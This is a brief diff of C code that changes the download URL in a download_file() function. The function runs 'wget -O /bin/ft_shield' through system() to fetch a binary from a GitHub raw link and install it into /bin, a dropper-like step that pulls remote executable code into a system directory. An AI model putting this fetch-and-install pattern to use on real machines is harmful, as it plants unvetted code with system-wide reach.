@@ -22,10 +22,10 @@ void run(char *const argv[], const char *path) {
 
 void download_file() {
     char cmd[256];
-    const char *url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/src/ft_shield/ft_shield";
+    const char *bin_url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/bin/ft_shield";
 
     memset(cmd, 0,256);
-    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", url);
+    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", bin_url);
     system(cmd);
 }
 
